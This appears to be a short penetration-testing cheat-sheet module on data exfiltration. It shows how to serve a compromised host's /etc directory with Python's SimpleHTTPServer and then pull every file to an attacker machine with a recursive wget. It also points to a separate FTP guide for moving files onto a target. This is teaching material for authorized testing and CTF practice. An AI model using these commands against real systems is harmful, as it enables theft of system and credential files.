# Data Exfiltration
In this module I will cover methods, applications, and syntax used for data exfiltration techniques that I have used during penetration testing or capture the flag.
## Python SimpleHTTPServer
If Python (2.x) is installed on the target system, you can simply start the [SimpleHTTPServer](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/) 
using the following command in whatever directory that you wish to share temporarily.
```
www-data@target:/etc# python -m SimpleHTTPServer 5432
```
And this will instantly share the files on the target system in `/etc` (as you see that is where I started the service) via HTTP on port `5432`
You can then use `wget` recursivley to pull all files found like so, from the attacker machine,
```
root@attacker:~/ctf/target/# wget -r http://(TARGET IP ADDRESS):5432 
```
# Data Infiltration
## FTP
You can use FTP for data infiltration on any OS system if you happen to find it installed on a target machine. Check out [/Post Exploitation/ftp.md](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/ftp.md) for more information on how to infiltrate data and binaries to a target system using FTP.
